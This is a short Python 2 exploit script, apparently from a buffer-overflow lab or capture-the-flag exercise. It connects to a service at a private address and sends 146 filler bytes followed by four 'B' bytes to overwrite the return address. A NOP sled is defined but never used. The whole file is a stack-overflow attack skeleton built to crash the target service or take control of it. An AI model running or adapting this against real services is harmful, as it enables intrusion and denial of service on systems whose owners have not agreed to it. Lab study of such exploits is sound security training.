#!/usr/bin/env python2
import socket

target_host = "10.0.2.7"
target_port = 42424

nops = "\x90" * 15 

payload = "A" * 146 + "B" * 4 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_host, target_port))

s.send(payload + "\r\n")
s.close()
